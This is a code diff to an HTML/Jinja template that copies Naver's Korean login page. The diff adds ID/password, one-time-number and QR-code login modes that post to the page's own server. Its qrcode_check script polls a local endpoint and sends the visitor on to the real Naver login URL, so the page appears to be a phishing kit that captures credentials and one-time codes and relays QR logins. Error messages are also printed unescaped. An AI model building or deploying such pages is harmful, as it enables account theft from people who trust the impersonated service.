@@ -13,6 +13,7 @@
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="1200">
     <title>네이버 : 로그인</title>
+    <link rel="shortcut icon" href="/static/img/favicon.ico">
     <link rel="stylesheet" type="text/css" href="/static/css/w_202105.css">
     <link rel="stylesheet" type="text/css" href="/static/css/nidlogin.css">
     <script src="https://code.jquery.com/jquery-latest.js"></script>
@@ -47,17 +48,17 @@
                 <div class="login_wrap">
                     <ul class="menu_wrap" role="tablist">
                         <li class="menu_item" role="presentation">
-                            <a id="loinid" class="menu_id on" role="tab" aria-selected="true" onclick="Change_Menu(0)">
+                            <a id="loinid" class="menu_id{{ ' on' if mode == 'form' else '' }}" role="tab" aria-selected="true" onclick="Change_Menu(0)">
                                 <span class="menu_text"><span class="text">ID 로그인</span></span>
                             </a>
                         </li>
                         <li class="menu_item" role="presentation">
-                            <a id="ones" class="menu_ones" role="tab" aria-selected="false" onclick="Change_Menu(1)">
+                            <a id="ones" class="menu_ones{{ ' on' if mode == 'ones' else '' }}" role="tab" aria-selected="false" onclick="Change_Menu(1)">
                                 <span class="menu_text"><span class="text">일회용 번호</span></span>
                             </a>
                         </li>
                         <li class="menu_item" role="presentation">
-                            <a id="qrcode" class="menu_qr" role="tab" aria-selected="false" onclick="Change_Menu(2)">
+                            <a id="qrcode" class="menu_qr{{ ' on' if mode == 'qrcode' else '' }}" role="tab" aria-selected="false" onclick="Change_Menu(2)">
                                 <span class="menu_text"><span class="text">QR코드</span></span>
                             </a>
                             <!--넛지배너-->
@@ -71,6 +72,7 @@
                     </ul>
                     <form id="frmNIDLogin" name="frmNIDLogin" target="_top" autocomplete="off"
                         action="/nidlogin.login" method="POST">
+                        {% if mode == 'form' %}
                         <input type="hidden" id="mode" name="mode" value="form">
                         <ul class="panel_wrap">
                             <li class="panel_item" style="display: block;">
@@ -140,10 +142,10 @@
                                             <strong>비밀번호</strong>를 입력해 주세요.
                                         </div>
                                     </div>
-                                    <div class="login_error_wrap" id="err_common" style="display: {{ display }};">
+                                    <div class="login_error_wrap" id="err_common" style="display: {{ 'block' if form_error_msg is not none else 'none' }};">
                                         <div class="error_message" style="width:90%">
                                             {% autoescape false %}
-                                            {{ error_msg }}
+                                            {{ form_error_msg if form_error_msg is not none else '' }}
                                             {% endautoescape %}
                                         </div>
                                     </div>
@@ -157,6 +159,87 @@
                                 </div>
                             </li>
                         </ul>
+                        {% elif mode == 'ones' %}
+                        <input type="hidden" id="mode" name="mode" value="ones">
+                        <ul class="panel_wrap">
+                            <li class="panel_item" style="display: block;">
+
+                                <div class="panel_inner" role="tabpanel" aria-controls="ones">
+                                    <!--안내-->
+                                    <div class="img_lock" aria-hidden="true"></div>
+                                    <div class="ones_text">
+                                        네이버앱의 <span class="accent">메뉴 &gt; 설정 <em class="bullet_set"></em> &gt; 로그인 아이디 관리<br> &gt; 일회용 로그인 번호 받기</span>에
+                                        보이는 번호를 입력해 주세요.
+                                    </div>
+
+                                    <!--일회용입력창-->
+                                    <div class="input_row" id="num_line">
+                                        <input type="text" id="disposable" name="key" placeholder="일회용 로그인 번호" title="일회용 로그인 번호" class="input_text">
+                                        <span role="button" class="btn_delete" id="num_clear" style="display: none;">
+                                            <span class="icon_delete"><span class="blind">삭제</span></span>
+                                        </span>
+                                    </div>
+                                    <div class="login_error_wrap" id="err_empty_no" style="display:{{ 'block' if ones_error_msg is not none else 'none' }};margin-top:0px;">
+                                        <span class="error_message">
+                                            {% autoescape false %}
+                                            {{ ones_error_msg if ones_error_msg is not none else '' }}
+                                            {% endautoescape %}
+                                        </span>
+                                    </div>
+                                    <div class="login_error_wrap" id="err_empty_no2" style="display:none;margin-top:0px;">
+                                        <span class="error_message">일회용 로그인 번호를 다시 입력해 주세요.<br>일회용 로그인 번호를 확인한 후 8자리 숫자를 다시 입력해 주세요.</span>
+                                    </div>
+                                    <div class="login_error_wrap" id="err_common" style="display:none;margin-top:0px;">
+                                        <span class="error_message">
+                                            <div class="error">일회용 로그인 번호를 확인한 후 다시 입력해 주세요.</div>
+                                        </span>
+                                    </div>
+                                    <!--버튼-->
+                                    <div class="btn_ones_wrap">
+                                        <button type="submit" class="btn_login" id="otnlog.login">
+                                            <!-- tg-text=loginbtn -->
+                                            <span class="btn_text">로그인</span>
+                                        </button>
+                                    </div>
+                                </div>
+                            </li>
+                        </ul>
+                        {% elif mode == 'qrcode' %}
+                        <input type="hidden" id="mode" name="mode" value="qrcode">
+                        <ul class="panel_wrap">
+                            <li class="panel_item" style="display: block;">
+
+                                <!-- tg-display=>{"QR코드": []} -->
+                                <div class="panel_inner" role="tabpanel" aria-controls="qrcode" id="qrImageDiv" style="display: none;">
+                                    <h2 class="top_desc">공용 네트워크, 공용 PC라면 안전을 위해<br> QR코드로 로그인해주세요.</h2>
+                                    <div class="sub_desc">
+                                        <span class="text">네이버 앱 <em class="bullet_greendot"></em> &gt; 렌즈 <em class="bullet_lens"></em> 를 눌러 QR코드를 스캔하여<br> 보이는 숫자 중 <strong class="point"></strong>를 선택하면 로그인 됩니다.</span>
+                                        <a href="#none" id="qrbanner_open" class="bullet_help"><span class="blind">도움말</span></a>
+                                    </div>
+                                    <div class="qrcode_map">
+                                        <img src="" width="174" height="174" alt="QR Code" id="qrImage" class="qr_img" style="padding:0px;">
+                                    </div>
+                                    <div class="time_wrap">
+                                        <p class="time_text">남은시간</p>
+                                        <p class="time_num" id="timeStamp">00:00</p>
+                                    </div>
+                                </div>
+                                <div class="panel_inner" role="tabpanel" aria-controls="qrcode" id="reloadGuide" style="display: none;">
+                                    <div class="qrcode_valid">
+                                        <p class="img_wowpoint"></p>
+                                        <h2 class="top_desc">QR코드 유효시간 초과</h2>
+                                        <div class="sub_desc">
+                                            해당 QR코드의 유효시간이 지났습니다.<br> 다시 로그인을 시도하시겠습니까?
+                                        </div>
+                                        <div class="time_wrap">
+                                            <a href="#" id="qrlog.retry" class="btn_renewal">재시도</a>
+                                        </div>
+                                    </div>
+                                </div>
+                                <!-- tg-display -->
+                            </li>
+                        </ul>
+                        {% endif %}
                     </form>
                 </div>
                 <ul class="find_wrap" id="find_wrap">
@@ -282,6 +365,31 @@
                 }
             })
         });
+
+        function qrcode_check()
+        {
+            $.ajax({
+                method: "POST",
+                url: "/qrcode",
+                success: function(res) {
+                    if (res["Status"] == "Waiting") {
+                        return;
+                    }
+                    else if (res["Status"] == "Failed") {
+                        alert("시간이 초과되었습니다.")
+                    }
+                    else if (res["Status"] == "Success") {
+                        location.href = "https://nid.naver.com/nidlogin.login?mode=qrcode";
+                    }
+                    else {
+                        alert("통신 실패")
+                    }
+                },
+                error: function(res) {
+                    alert("qr 코드로 로그인할 수 없습니다.")
+                }
+            })
+        }
     </script>
 </body>
 
